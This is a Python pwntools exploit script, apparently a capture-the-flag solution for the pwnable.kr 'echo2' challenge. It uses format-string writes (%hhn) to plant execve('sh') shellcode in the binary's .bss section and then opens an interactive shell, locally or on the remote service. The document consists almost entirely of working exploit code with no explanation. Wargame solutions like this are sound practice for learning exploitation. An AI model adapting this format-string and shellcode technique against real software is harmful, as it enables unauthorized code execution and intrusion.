#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
from libnum import s2n
import sys
context(log_level = "debug", os = "linux", arch = "amd64")
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

if sys.argv[1] == 'l':
    io = process("./echo2")
    elf = ELF("./echo2")
else:
    io = remote("pwnable.kr", 9011)
    elf = ELF("./echo2")

def DEBUG():
    raw_input("DEBUG: ")
    gdb.attach(io)

def writeSc():
    shellcode = asm(shellcraft.execve("sh"))
    base = elf.bss()

    i = 0
    while i < len(shellcode):
        #  print s2n(shellcode[i: i + 2])
        payload = "%" + str(s2n(shellcode[i: i + 2])) + "c%8$hhn"
        payload = payload.ljust(16, "|") + p64(base + i)
        #  print payload
        io.sendlineafter("> ", "2")
        io.sendlineafter("m4x\n", payload)
        i += 2

if __name__ == "__main__":
    io.sendlineafter("name? : ", "m4x")
    writeSc()
    #  DEBUG()
    io.interactive()
